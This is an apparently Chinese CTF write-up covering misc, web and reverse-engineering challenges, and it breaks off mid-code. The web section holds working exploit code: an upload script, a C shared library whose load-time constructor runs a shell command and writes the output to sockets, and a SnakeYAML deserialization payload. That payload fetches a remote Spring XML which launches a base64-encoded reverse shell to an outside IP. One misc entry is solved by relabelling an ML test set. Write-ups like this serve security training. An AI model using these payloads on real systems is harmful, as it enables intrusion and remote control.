src="/./img/nkKJRaeNGhIi-OWJ/1754444140590-3b368ceb-17a1-4278-9cdc-56d651958a04-162734.png" alt="1754444140590-3b368ceb-17a1-4278-9cdc-56d651958a04.png"></p><p>发现TLS流量加密的密钥有泄露，将其保存下来</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754447919105-0733c1a9-58e8-437d-9814-f89b18616c4d-368490.png" alt="1754447919105-0733c1a9-58e8-437d-9814-f89b18616c4d.png"></p><p><font style="color:rgb(27, 28, 29);">wireshark中Edit (编辑) -&gt; Preferences (首选项)</font></p><p><font style="color:rgb(27, 28, 29);">在弹出的“Preferences”窗口中，展开左侧的 </font><strong><font style="color:rgb(27, 28, 29);">Protocols (协议)</font></strong><font style="color:rgb(27, 28, 29);"> 列表，找到TLS，在</font><strong><font style="color:rgb(27, 28, 29);">(Pre)-Master-Secret log filename</font></strong><font style="color:rgb(27, 28, 29);">处设置密钥文件。再次打开流量文件即可解析TLS流量。</font></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754448020165-512b758d-125b-4c54-83bd-43b039189751-024325.png" alt="1754448020165-512b758d-125b-4c54-83bd-43b039189751.png"></p><p><font style="color:rgb(27, 28, 29);">追踪http流发现有文件上传。</font></p><p><font style="color:rgb(27, 28, 29);">提取压缩包</font></p><p><font style="color:rgb(27, 28, 29);">密码PanShi2025!</font></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754455734117-00ecce2a-1016-455b-a54e-c582ed4a0057-960976.png" alt="1754455734117-00ecce2a-1016-455b-a54e-c582ed4a0057.png"></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754455712215-9eac7d33-849d-44f1-8913-a830a895cccd-430968.png" alt="1754455712215-9eac7d33-849d-44f1-8913-a830a895cccd.png"></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754456046668-ca0e23a5-d1b9-47ee-a9f5-07d4b619b79b-984456.png" alt="1754456046668-ca0e23a5-d1b9-47ee-a9f5-07d4b619b79b.png"></p><p>爆破crc</p><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/psd/42988179/1754474997090-7855efbb-536b-48c0-bed9-095004444af6.psd">secret.psd</a></p><p>FAKE_FLAG{nizenmezhemeshuliana!}</p><p>有压缩包</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461292833-865a3884-18d2-49a8-8665-3f920c537beb-961603.png" alt="1754461292833-865a3884-18d2-49a8-8665-3f920c537beb.png"></p><p>伪加密</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461419309-df54dfe7-6153-4425-8de2-45b3107266b6-851048.png" alt="1754461419309-df54dfe7-6153-4425-8de2-45b3107266b6.png"></p><p>ook</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461475136-babb9e18-fdcd-41c1-a8c9-8783e22813c7-700799.png" alt="1754461475136-babb9e18-fdcd-41c1-a8c9-8783e22813c7.png"></p><p>y0u_c@t_m3!!!</p><h2 id="ModelUnguilty"><a href="#ModelUnguilty" class="headerlink" title="ModelUnguilty"></a>ModelUnguilty</h2><p>找不到“秘密指令”，干脆破罐子破摔直接把测试集里3&#x2F;4的spam改成not_spam，结果就过了。。。。</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754481188099-5c769537-4e34-401a-8e39-81241d3b4c64-936787.png" alt="1754481188099-5c769537-4e34-401a-8e39-81241d3b4c64.png"></p><h2 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h2><p>发现steg隐写提取出一张png</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754475115520-5f9df384-64f9-41bb-ad74-c1b470e74914-500021.png" alt="1754475115520-5f9df384-64f9-41bb-ad74-c1b470e74914.png"></p><p>盲水印后没东西</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezDecryption"><a href="#ezDecryption" class="headerlink" title="ezDecryption"></a>ezDecryption</h2><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754444718164-775efb83-bb8e-4aea-9340-0e4ba2623dae-667613.png" alt="1754444718164-775efb83-bb8e-4aea-9340-0e4ba2623dae.png"></p><h2 id="web-jaba-ez"><a href="#web-jaba-ez" class="headerlink" title="web-jaba_ez"></a>web-jaba_ez</h2><p>应该是非预期，另一个jar包都没用到。</p><p><font style="color:#080808;background-color:#ffffff;">&#x2F;job&#x2F;run&#x2F;{jobName} 路由可以执行任意方法，静态非静态都可以，但必须得是public。而且有黑名单。</font></p><p><font style="color:#080808;background-color:#ffffff;">java.lang.System#load不在黑名单里，可以加载任意 so 文件。上传文件：</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://pss.idss-cn.com:21207&#x27;</span><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test2.so&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br><br>res = requests.post(url=url + <span class="hljs-string">&#x27;/api/upload&#x27;</span>, files = &#123;<span class="hljs-string">&quot;file&quot;</span> : file&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>然后添加job：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;jobName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test5&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;invokeTarget&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.System#load(&#x27;/tmp/uploads/test2.so&#x27;)com.jabaez.FLAG&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在 invokeTarget 的括号外面加上 com.jabaez.FLAG 来绕过白名单。然后 POST 访问 &#x2F;api&#x2F;job&#x2F;run&#x2F;test5 即可执行。测试发现 load &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 文件不会报错，说明是 amd64 系统。使用 <strong>attribute</strong> ((<strong>constructor</strong>)) void preload (void) 语法使其在 load 阶段就可以直接执行而不是依赖于 native 方法。</p><p>似乎不出网，通过写 fd 文件回显，so 文件源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">captureOutput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmd, <span class="hljs-type">char</span>* buffer, <span class="hljs-type">size_t</span> buf_size)</span> &#123;<br>    FILE* fp = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!fp) &#123;<br>        perror(<span class="hljs-string">&quot;popen failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> total_read = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>* pos = buffer;<br>    <span class="hljs-keyword">while</span> (fgets(pos, buf_size - total_read, fp) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">size_t</span> bytes_read = <span class="hljs-built_in">strlen</span>(pos);<br>        total_read += bytes_read;<br>        pos += bytes_read;<br>        <span class="hljs-keyword">if</span> (total_read &gt;= buf_size - <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 防止溢出</span><br>    &#125;<br>    buffer[total_read] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 终止字符串</span><br>    pclose(fp);<br>&#125;<br><br><br><span class="hljs-comment">// 构造函数：在 .so 文件加载时自动执行（早于任何 JNI 方法调用）</span><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Preload] Constructor executed! Library is loaded.\n&quot;</span>);<br>    <span class="hljs-comment">// 此处可初始化全局资源（如配置、线程池、注册回调等）</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> cmd[<span class="hljs-number">256</span>] = <span class="hljs-string">&quot;cat /flag.txt&quot;</span>;<br>    <span class="hljs-type">char</span> output[<span class="hljs-number">40960</span>];<br>    captureOutput(cmd, output, <span class="hljs-keyword">sizeof</span>(output));<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data = output;<br><br>    DIR *dir;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> *<span class="hljs-title">entry</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">statbuf</span>;</span><br>    <span class="hljs-type">char</span> path[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">ssize_t</span> write_result;<br><br>    <span class="hljs-comment">// 1. 打开 /proc/self/fd 目录</span><br>    dir = opendir(<span class="hljs-string">&quot;/proc/self/fd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!dir) &#123;<br>        perror(<span class="hljs-string">&quot;opendir failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;检测到的Socket文件描述符：\n&quot;</span>);<br><br>    <span class="hljs-comment">// 2. 遍历目录中的文件描述符</span><br>    <span class="hljs-keyword">while</span> ((entry = readdir(dir)) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">// 跳过 &quot;.&quot; 和 &quot;..&quot; 目录项</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(entry-&gt;d_name, <span class="hljs-string">&quot;.&quot;</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(entry-&gt;d_name, <span class="hljs-string">&quot;..&quot;</span>) == <span class="hljs-number">0</span>) <br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-comment">// 构建完整路径：/proc/self/fd/&lt;fd&gt;</span><br>        <span class="hljs-built_in">snprintf</span>(path, <span class="hljs-keyword">sizeof</span>(path), <span class="hljs-string">&quot;/proc/self/fd/%s&quot;</span>, entry-&gt;d_name);<br><br>        <span class="hljs-comment">// 3. 获取文件状态信息</span><br>        <span class="hljs-keyword">if</span> (lstat(path, &amp;statbuf) == <span class="hljs-number">-1</span>) &#123;<br>            perror(<span class="hljs-string">&quot;lstat failed&quot;</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 4. 检查是否为socket文件（S_IFSOCK标志）</span><br>        <span class="hljs-keyword">if</span> (S_ISLNK(statbuf.st_mode)) &#123;<br>            <span class="hljs-comment">// 3. 解析目标类型（需额外读取链接内容）</span><br>            <span class="hljs-type">char</span> target[<span class="hljs-number">256</span>];<br>            <span class="hljs-type">ssize_t</span> len = readlink(path, target, <span class="hljs-keyword">sizeof</span>(target)<span class="hljs-number">-1</span>);<br>            <span class="hljs-keyword">if</span> (len == <span class="hljs-number">-1</span>) &#123;<br>                perror(<span class="hljs-string">&quot;readlink failed&quot;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            target[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>            <span class="hljs-comment">// 4. 根据目标路径判断类型（示例：套接字）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(target, <span class="hljs-string">&quot;socket:&quot;</span>) != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unix 域套接字 (inode: %s)\n&quot;</span>, target + <span class="hljs-number">7</span>); <span class="hljs-comment">// 提取 inode 号</span><br><br>                <span class="hljs-type">int</span> fd = atoi(entry-&gt;d_name); <span class="hljs-comment">// 将描述符字符串转为整数</span><br><br>                <span class="hljs-comment">// 5. 尝试写入数据</span><br>                write_result = write(fd, data, <span class="hljs-built_in">strlen</span>(data));<br>                <span class="hljs-keyword">if</span> (write_result == <span class="hljs-number">-1</span>) &#123;<br>                    perror(<span class="hljs-string">&quot;写入失败&quot;</span>); <span class="hljs-comment">// 常见错误：EBADF（无效描述符）、ENOTSOCK（非socket）</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功写入 %zd 字节\n&quot;</span>, write_result);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;普通文件或目录\n&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;非符号链接\n&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 6. 关闭目录并退出</span><br>    closedir(dir);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fPIC  -shared -o test2.so exp.c<br></code></pre></td></tr></table></figure><p>写 fd 回显属于操作 tcp 数据达成回显，所以执行结果在 HTTP 头上面。</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754454175701-5062a5d1-b2e7-4b42-b715-d7b6993e1c9a-689928.png" alt="1754454175701-5062a5d1-b2e7-4b42-b715-d7b6993e1c9a.png"></p><p>编译 so 所使用的系统：Linux kali 6.1.0-kali9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1 (2023-05-12) x86_64 GNU&#x2F;Linux</p><h2 id="web-ezyaml"><a href="#web-ezyaml" class="headerlink" title="web_ezyaml"></a>web_ezyaml</h2><p>yaml 反序列化，没过滤 org.springframework.context.support.FileSystemXmlApplicationContext 类，这个类跟 ClassPathXmlApplicationContext 作用一样。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!org.springframework.context.support.FileSystemXmlApplicationContext</span> [ <span class="hljs-string">&quot;http://ip:port/exp.xml&quot;</span> ]<br></code></pre></td></tr></table></figure><p>exp.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzcuNjIuMjMyLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>找到加密函数和加密密文</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754463097058-57f0fa64-f238-417c-b3bc-8a892cd46557-198075.png" alt="1754463097058-57f0fa64-f238-417c-b3bc-8a892cd46557.png"></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754463197356-9d973190-9152-4f8a-b74d-2733fae9d2b0-100595.png" alt="1754463197356-9d973190-9152-4f8a-b74d-2733fae9d2b0.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val, r_bits</span>):<br>    <span class="hljs-keyword">return</span> ((val &gt;&gt; r_bits) | (val &lt;&lt; (<span class="hljs-number">8</span> - r_bits))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_v23</span>():<br>    v23 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        v8 = (v8 + v23[i] - <span class="hljs-number">7</span> * (i // <span class="hljs-number">7</span>) + i + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span><br>        v23[i], v23[v8] = v23[v8], v23[i]<br>    <span class="hljs-keyword">return</span> v23<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stage2_reverse</span>(<span class="hljs-params">data</span>):<br>    result = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>            result[i] = data[i] ^ <span class="hljs-number">0x42</span><br>        <span class="hljs-keyword">else</span>:<br>            result[i] = data[i] ^ <span class="hljs-number">0x42</span> ^ data[i - <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher</span>):<br>    <span class="hljs-comment"># Step 1: Reverse the final XOR+chaining layer</span><br>    stage2 = stage2_reverse(cipher)<br><br>    <span class="hljs-comment"># Step 2: Reverse RC4-like encryption with ROL and temp add</span><br>    v23 = init_v23()<br>    v14 = <span class="hljs-number">0</span><br>    v15 = <span class="hljs-number">0</span><br>    plain = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(stage2)):<br>        v14 = (v14 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> v14 % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>            v20 = (v23[(<span class="hljs-number">3</span> * v14) % <span class="hljs-number">256</span>] + v15) % <span class="hljs-number">256</span><br>        <span class="hljs-keyword">else</span>:<br>            v20 = (v23[v14] + v15) % <span class="hljs-number">256</span><br>        v15 = v20 % <span class="hljs-number">256</span><br>        v23[v14], v23[v15] = v23[v15], v23[v14]<br>        idx = (v23[v14] + v23[v15]) % <span class="hljs-number">256</span><br>        temp = (v14 * v15) % <span class="hljs-number">16</span><br>        byte = ror(stage2[i], <span class="hljs-number">3</span>)<br>        plain_byte = (byte - temp) &amp; <span class="hljs-number">0xFF</span><br>        plain_byte ^= v23[idx]<br>        plain.append(plain_byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>cipher = [<br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x05</span>,<br>    <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xD8</span>,<br>    <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x9A</span>,<br>    <span class="hljs-number">0x37</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x57</span><br>]<br><br>flag = decrypt(cipher)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag:&quot;</span>, flag.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br></code></pre></td></tr></table></figure><h2 id="My-Key"><a href="#My-Key" class="headerlink" title="My-Key"></a>My-Key</h2><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754450811338-4878e17b-09c9-48d0-b0c9-1daa4348fd80-386347.png" alt="1754450811338-4878e17b-09c9-48d0-b0c9-1daa4348fd80.png"></p><p>尾地址40a0找到加密比较逻辑</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461273773-f0d104c2-60e1-4c37-be1a-e0b1bcca7968-391785.png" alt="1754461273773-f0d104c2-60e1-4c37-be1a-e0b1bcca7968.png"></p><p>ida管理员权限打开附加到一个打开的mfc程序在这里下断点</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461354178-048d2ce0-47f0-49da-9a17-175768e82a91-661588.png" alt="1754461354178-048d2ce0-47f0-49da-9a17-175768e82a91.png"></p><p>加密第一轮先把固定字符串与我们输入的按位异或 WcE4Bbm4kHYQsAcX </p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461675459-a60f66ec-c54c-4a11-a3ec-a09cb7de1af2-939560.png" alt="1754461675459-a60f66ec-c54c-4a11-a3ec-a09cb7de1af2.png">这里应该是每四位取一个16进制数，然后按照他的逻辑进行右移处理</p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754461787119-47a0980a-9ee0-4d14-abf0-5cacc4f64142-628644.png" alt="1754461787119-47a0980a-9ee0-4d14-abf0-5cacc4f64142.png"></p><p>这里还有对长度的判断，这里是cmp内部函数目前测出输入至少应该是27位起（这里&#96;可能不是）</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>去花后<img src="/./img/nkKJRaeNGhIi-OWJ/1754483793568-b0569f19-0b65-40a0-8435-f3f7454363b2-285522.png" alt="1754483793568-b0569f19-0b65-40a0-8435-f3f7454363b2.png"></p><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754483781363-3d0c6d68-1cac-46f0-ade7-86d290fd6cac-896002.png" alt="1754483781363-3d0c6d68-1cac-46f0-ade7-86d290fd6cac.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 